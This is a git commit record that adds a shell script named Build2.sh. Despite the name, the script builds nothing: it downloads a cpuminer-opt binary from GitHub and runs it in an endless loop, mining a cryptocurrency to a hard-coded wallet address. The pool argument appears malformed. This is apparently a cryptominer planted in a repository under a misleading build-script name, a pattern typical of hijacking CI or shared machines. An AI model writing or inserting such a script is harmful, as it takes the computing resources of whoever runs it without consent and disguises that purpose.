9f654ad764256cbd43cab49f0a80c52e28f8d41e
set-arithmetic <79969777+set-arithmetic@users.noreply.github.com>
2024-03-22 01:29:35 +0700

    Create Build2.sh

---
+++ Build2.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+while [ 1 ]; do
+./cpuminer-avx2 -a yespowerSUGAR -o 17042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.scrip 2
+sleep 5
+done
